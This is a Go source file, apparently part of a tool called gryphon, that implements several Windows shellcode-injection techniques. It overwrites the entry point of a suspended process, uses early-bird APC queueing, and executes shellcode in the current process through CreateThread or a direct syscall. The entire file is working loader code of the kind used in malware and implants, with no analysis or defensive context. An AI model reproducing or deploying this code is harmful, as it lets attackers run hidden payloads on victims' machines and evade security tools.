package shellcode

import (
	"encoding/binary"
	"encoding/hex"
	"syscall"
	"unsafe"

	"github.com/whiterabb17/gryphon/variables"
	"golang.org/x/sys/windows"
)

func injectIntoProcess(process, args, data string) bool {
	shellcode, errShellcode := hex.DecodeString(data)
	if errShellcode != nil {
		return false
	}
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := windows.CreateProcess(windows.StringToUTF16Ptr(process), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		return false
	}
	addr, _, errVirtualAlloc := variables.ProcVirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return false
	}
	if addr == 0 {
		return false
	}
	_, _, errWriteProcessMemory := variables.ProcWriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		return false
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := variables.ProcVirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		return false
	}
	var processInformation variables.PROCESS_BASIC_INFORMATION
	var returnLength uintptr
	ntStatus, _, errNtQueryInformationProcess := variables.ProcNtQueryInformationProcess.Call(uintptr(procInfo.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)
	if errNtQueryInformationProcess != nil && errNtQueryInformationProcess.Error() != "The operation completed successfully." {
		return false
	}
	if ntStatus != 0 {
		if ntStatus == 3221225476 {
			return false
		}
		return false
	}
	var peb variables.PEB
	var readBytes int32
	_, _, errReadProcessMemory := variables.ProcReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
	if errReadProcessMemory != nil && errReadProcessMemory.Error() != "The operation completed successfully." {
		return false
	}
	var dosHeader variables.IMAGE_DOS_HEADER
	var readBytes2 int32
	_, _, errReadProcessMemory2 := variables.ProcReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
	if errReadProcessMemory2 != nil && errReadProcessMemory2.Error() != "The operation completed successfully." {
		return false
	}
	if dosHeader.E_magic != 23117 {
		return false
	}
	var Signature uint32
	var readBytes3 int32
	_, _, errReadProcessMemory3 := variables.ProcReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.E_lfanew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))
	if errReadProcessMemory3 != nil && errReadProcessMemory3.Error() != "The operation completed successfully." {
		return false
	}
	if Signature != 17744 {
		return false
	}
	var peHeader variables.IMAGE_FILE_HEADER
	var readBytes4 int32
	_, _, errReadProcessMemory4 := variables.ProcReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.E_lfanew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))
	if errReadProcessMemory4 != nil && errReadProcessMemory4.Error() != "The operation completed successfully." {
		return false
	}
	var optHeader64 variables.IMAGE_OPTIONAL_HEADER64
	var optHeader32 variables.IMAGE_OPTIONAL_HEADER32
	var errReadProcessMemory5 error
	var readBytes5 int32
	if peHeader.Machine == 34404 {
		_, _, errReadProcessMemory5 = variables.ProcReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.E_lfanew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
	} else if peHeader.Machine == 332 {
		_, _, errReadProcessMemory5 = variables.ProcReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.E_lfanew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
	} else {
		return false
	}
	if errReadProcessMemory5 != nil && errReadProcessMemory5.Error() != "The operation completed successfully." {
		return false
	}
	var ep uintptr
	if peHeader.Machine == 34404 {
		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
	} else if peHeader.Machine == 332 {
		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
	} else {
		return false
	}
	var epBuffer []byte
	var shellcodeAddressBuffer []byte
	if peHeader.Machine == 34404 {
		epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8)
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else if peHeader.Machine == 332 {
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4)
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else {
		return false
	}
	epBuffer = append(epBuffer, byte(0xff))
	epBuffer = append(epBuffer, byte(0xe0))
	_, _, errWriteProcessMemory2 := variables.ProcWriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))
	if errWriteProcessMemory2 != nil && errWriteProcessMemory2.Error() != "The operation completed successfully." {
		return false
	}
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		return false
	}
	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
	if errCloseProcHandle != nil {
		return false
	}
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		return false
	}
	return true
}

func injectIntoProcessEarlyBird(process, args, data string) bool {
	shellcode, errShellcode := hex.DecodeString(data)
	if errShellcode != nil {
		return false
	}
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := windows.CreateProcess(windows.StringToUTF16Ptr(process), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		return false
	}
	addr, _, errVirtualAlloc := variables.ProcVirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return false
	}
	if addr == 0 {
		return false
	}
	_, _, errWriteProcessMemory := variables.ProcWriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		return false
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := variables.ProcVirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		return false
	}
	_, _, err := variables.ProcQueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
	if err != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		return false
	}
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		return false
	}
	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
	if errCloseProcHandle != nil {
		return false
	}
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		return false
	}
	return true
}

func syscallInjectShellcode(data string) bool {
	shellcode, errShellcode := hex.DecodeString(data)
	if errShellcode != nil {
		return false
	}
	addr, _, errVirtualAlloc := variables.ProcVirtualAlloc.Call(0, uintptr(len(shellcode)), variables.MEM_COMMIT|variables.MEM_RESERVE, variables.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return false
	}
	if addr == 0 {
		return false
	}
	_, _, errRtlCopyMemory := variables.ProcRtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		return false
	}
	oldProtect := variables.PAGE_READWRITE
	_, _, errVirtualProtect := variables.ProcVirtualProtect.Call(addr, uintptr(len(shellcode)), variables.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		return false
	}
	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)
	if errSyscall != 0 {
		return false
	}
	return true
}

func createThreadInject(data string) bool {
	shellcode, errShellcode := hex.DecodeString(data)
	if errShellcode != nil {
		return false
	}
	addr, errVirtualAlloc := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil {
		return false
	}
	if addr == 0 {
		return false
	}
	_, _, errRtlCopyMemory := variables.ProcRtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		return false
	}
	var oldProtect uint32
	errVirtualProtect := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if errVirtualProtect != nil {
		return false
	}
	thread, _, errCreateThread := variables.ProcCreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
		return false
	}
	_, errWaitForSingleObject := windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
	if errWaitForSingleObject != nil {
		return false
	}
	return true
}

func SyscallExec(Shellcode []byte) bool {
	Addr, _, _ := variables.ProcVirtualAlloc.Call(0, uintptr(len(Shellcode)), variables.MEM_RESERVE|variables.MEM_COMMIT, variables.PAGE_EXECUTE_READWRITE)
	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}
	go syscall.Syscall(Addr, 0, 0, 0, 0)
	return true
}
